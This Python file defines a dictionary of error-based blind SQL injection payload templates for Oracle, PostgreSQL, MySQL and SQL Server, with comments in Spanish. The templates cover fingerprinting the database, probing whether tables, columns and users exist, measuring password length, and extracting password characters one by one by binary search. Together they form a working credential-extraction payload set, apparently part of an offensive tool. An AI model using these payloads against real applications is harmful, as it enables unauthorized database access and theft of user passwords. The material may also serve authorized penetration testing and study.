DB_PROFILES = {
    "oracle": {
        "name": "Oracle",
        "concat_open": "'||(",
        "concat_close": ")||'",
        "from_dummy": " FROM dual",
        "error_true": "TO_CHAR(1/0)",
        "error_false": "''",
        "substr_fn": "SUBSTR",
        "length_fn": "LENGTH",
        "ascii_fn": "ASCII",
        # ── Payloads de fingerprinting ──
        "fingerprint_true":  "'||(SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
        "fingerprint_false": "'||(SELECT CASE WHEN 1=2 THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
        # ── Existencia de tabla ──
        "table_exists": "'||(SELECT '' FROM {table} WHERE ROWNUM=1)||'",
        # ── Existencia de columna (usamos la tabla + condición que siempre es válida) ──
        "column_exists": "'||(SELECT {column} FROM {table} WHERE ROWNUM=1)||'",
        # ── Existencia de usuario ──
        "user_exists": (
            "'||(SELECT CASE WHEN (SELECT {col_user} FROM {table} "
            "WHERE {col_user}='{user}') = '{user}' "
            "THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
        ),
        # ── Longitud del password ──
        "password_length": (
            "'||(SELECT CASE WHEN LENGTH({col_pass})>{length} "
            "THEN TO_CHAR(1/0) ELSE '' END "
            "FROM {table} WHERE {col_user}='{user}')||'"
        ),
        # ── Extracción de carácter (búsqueda binaria: ASCII > mid) ──
        "extract_char": (
            "'||(SELECT CASE WHEN ASCII(SUBSTR({col_pass},{pos},1))>{mid} "
            "THEN TO_CHAR(1/0) ELSE '' END "
            "FROM {table} WHERE {col_user}='{user}')||'"
        ),
    },

    "postgresql": {
        "name": "PostgreSQL",
        "concat_open": "'||(",
        "concat_close": ")||'",
        "from_dummy": "",
        "error_true": "CAST(1/0 AS TEXT)",
        "error_false": "''",
        "substr_fn": "SUBSTRING",
        "length_fn": "LENGTH",
        "ascii_fn": "ASCII",
        "fingerprint_true":  "'||(SELECT CASE WHEN 1=1 THEN CAST(1/0 AS TEXT) ELSE '' END)||'",
        "fingerprint_false": "'||(SELECT CASE WHEN 1=2 THEN CAST(1/0 AS TEXT) ELSE '' END)||'",
        "table_exists": "'||(SELECT '' FROM {table} LIMIT 1)||'",
        "column_exists": "'||(SELECT {column}::TEXT FROM {table} LIMIT 1)||'",
        "user_exists": (
            "'||(SELECT CASE WHEN (SELECT {col_user} FROM {table} "
            "WHERE {col_user}='{user}') = '{user}' "
            "THEN CAST(1/0 AS TEXT) ELSE '' END)||'"
        ),
        "password_length": (
            "'||(SELECT CASE WHEN LENGTH({col_pass})>{length} "
            "THEN CAST(1/0 AS TEXT) ELSE '' END "
            "FROM {table} WHERE {col_user}='{user}')||'"
        ),
        "extract_char": (
            "'||(SELECT CASE WHEN ASCII(SUBSTRING({col_pass},{pos},1))>{mid} "
            "THEN CAST(1/0 AS TEXT) ELSE '' END "
            "FROM {table} WHERE {col_user}='{user}')||'"
        ),
    },

    "mysql": {
        "name": "MySQL",
        "concat_open": "' AND (",
        "concat_close": ")-- -",
        "from_dummy": "",
        "error_true": "(SELECT table_name FROM information_schema.tables)",
        "error_false": "'a'",
        "substr_fn": "SUBSTRING",
        "length_fn": "LENGTH",
        "ascii_fn": "ASCII",
        # MySQL no soporta || como concat por defecto, usamos AND + subconsulta con error.
        # El truco: SELECT IF(cond, (subquery que devuelve >1 fila = error), 'a')
        "fingerprint_true": (
            "' AND (SELECT IF(1=1,"
            "(SELECT table_name FROM information_schema.tables),"
            "'a'))='a'-- -"
        ),
        "fingerprint_false": (
            "' AND (SELECT IF(1=2,"
            "(SELECT table_name FROM information_schema.tables),"
            "'a'))='a'-- -"
        ),
        "table_exists": (
            "' AND (SELECT IF("
            "(SELECT COUNT(*) FROM information_schema.tables "
            "WHERE table_name='{table}')>0,"
            "(SELECT table_name FROM information_schema.tables),"
            "'a'))='a'-- -"
        ),
        "column_exists": (
            "' AND (SELECT IF("
            "(SELECT COUNT(*) FROM information_schema.columns "
            "WHERE table_name='{table}' AND column_name='{column}')>0,"
            "(SELECT table_name FROM information_schema.tables),"
            "'a'))='a'-- -"
        ),
        "user_exists": (
            "' AND (SELECT IF("
            "(SELECT COUNT(*) FROM {table} WHERE {col_user}='{user}')>0,"
            "(SELECT table_name FROM information_schema.tables),"
            "'a'))='a'-- -"
        ),
        "password_length": (
            "' AND (SELECT IF("
            "(SELECT LENGTH({col_pass}) FROM {table} WHERE {col_user}='{user}')>{length},"
            "(SELECT table_name FROM information_schema.tables),"
            "'a'))='a'-- -"
        ),
        "extract_char": (
            "' AND (SELECT IF("
            "ASCII(SUBSTRING((SELECT {col_pass} FROM {table} WHERE {col_user}='{user}'),{pos},1))>{mid},"
            "(SELECT table_name FROM information_schema.tables),"
            "'a'))='a'-- -"
        ),
    },

    "mssql": {
        "name": "Microsoft SQL Server",
        "concat_open": "' + (",
        "concat_close": ") + '",
        "from_dummy": "",
        "error_true": "CAST(1/0 AS VARCHAR)",
        "error_false": "''",
        "substr_fn": "SUBSTRING",
        "length_fn": "LEN",
        "ascii_fn": "ASCII",
        "fingerprint_true":  "' + (SELECT CASE WHEN 1=1 THEN CAST(1/0 AS VARCHAR) ELSE '' END) + '",
        "fingerprint_false": "' + (SELECT CASE WHEN 1=2 THEN CAST(1/0 AS VARCHAR) ELSE '' END) + '",
        "table_exists": (
            "' + (SELECT CASE WHEN "
            "(SELECT COUNT(*) FROM information_schema.tables WHERE table_name='{table}')>0 "
            "THEN CAST(1/0 AS VARCHAR) ELSE '' END) + '"
        ),
        "column_exists": (
            "' + (SELECT CASE WHEN "
            "(SELECT COUNT(*) FROM information_schema.columns "
            "WHERE table_name='{table}' AND column_name='{column}')>0 "
            "THEN CAST(1/0 AS VARCHAR) ELSE '' END) + '"
        ),
        "user_exists": (
            "' + (SELECT CASE WHEN "
            "(SELECT COUNT(*) FROM {table} WHERE {col_user}='{user}')>0 "
            "THEN CAST(1/0 AS VARCHAR) ELSE '' END) + '"
        ),
        "password_length": (
            "' + (SELECT CASE WHEN "
            "(SELECT LEN({col_pass}) FROM {table} WHERE {col_user}='{user}')>{length} "
            "THEN CAST(1/0 AS VARCHAR) ELSE '' END) + '"
        ),
        "extract_char": (
            "' + (SELECT CASE WHEN "
            "ASCII(SUBSTRING((SELECT {col_pass} FROM {table} WHERE {col_user}='{user}'),{pos},1))>{mid} "
            "THEN CAST(1/0 AS VARCHAR) ELSE '' END) + '"
        ),
    },
}